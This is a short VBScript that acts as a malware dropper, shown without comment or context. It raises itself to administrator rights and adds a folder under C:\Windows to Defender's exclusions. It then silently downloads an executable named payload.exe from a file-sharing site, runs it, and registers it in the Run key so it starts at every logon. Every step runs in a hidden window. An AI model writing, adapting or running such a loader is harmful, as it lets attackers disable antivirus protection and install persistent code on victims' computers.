If Not WScript.Arguments.Named.Exists("elevate") Then
  CreateObject("Shell.Application").ShellExecute WScript.FullName _
    , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
  WScript.Quit
End If


Dim objFSO
Set objFSO = CreateObject("Scripting.FileSystemObject")
Dim pasta


pasta = "C:\Windows\win"


If Not objFSO.FolderExists(pasta) Then

    objFSO.CreateFolder(pasta)

Else

End If

Set objFSO = Nothing



Set oShell = CreateObject ("WScript.Shell") 

oShell.run "cmd.exe /C powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath ""C:\Windows\win"" ", 0, True
oShell.run "powershell.exe /C Invoke-WebRequest -Uri https://filebin.net/vssssssssssssssssssss/payload.exe -OutFile ""C:\Windows\win\bin.exe""", 0, True
oShell.run "powershell.exe /C Start-Process -FilePath ""C:\Windows\win\bin.exe"" ", 0, True
oShell.run "powershell.exe /C New-ItemProperty -Path ""HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" -Name ""winwinwin"" -Value ""C:\Windows\win\bin.exe""  -PropertyType ""String"" ", 0, True


